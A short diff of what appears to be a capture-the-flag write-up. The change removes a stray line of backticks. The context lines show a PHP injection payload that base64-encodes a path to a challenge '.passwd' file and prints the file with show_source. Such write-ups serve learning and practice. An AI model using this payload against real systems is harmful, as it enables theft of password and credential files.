@@ -130,7 +130,6 @@ We can see that there is a .passwd file so we just now have to open with the fol
 
 ```php 
 echo show_source(implode(array(base64_decode(L2NoYWxsZW5nZS9hcHAtc2NyaXB0L2NoMTMvcGFzc3dkLy5wYXNzd2Q))));
-``
 ```
 
 Wich will be interpreted as :
